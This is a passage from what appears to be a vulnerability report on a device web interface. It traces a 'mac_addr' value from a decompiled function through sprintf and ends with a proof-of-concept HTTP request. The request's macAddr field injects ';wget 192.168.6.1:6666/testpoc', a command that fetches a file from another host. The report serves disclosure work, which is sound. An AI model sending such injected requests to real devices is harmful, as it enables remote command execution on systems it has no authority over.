...
When the value of `page` is `AddMac`, the function sub_4030F8 will be called.

<div  align="center"><img src="./img/ftext.png" style="zoom:80%;" /></div>

the value of the `mac_addr`  is inserted into `v7`  using `sprintf`,and the value of v7 will be handled by the function sub_404850.

<div  align="center"><img src="./img/sub_4030F8.png" style="zoom:80%;" /></div>
...
Cookie: session=872403967
Connection: keep-alive
Content-Length: 59

page=AddMac&addName=&macAddr=;wget 192.168.6.1:6666/testpoc
```
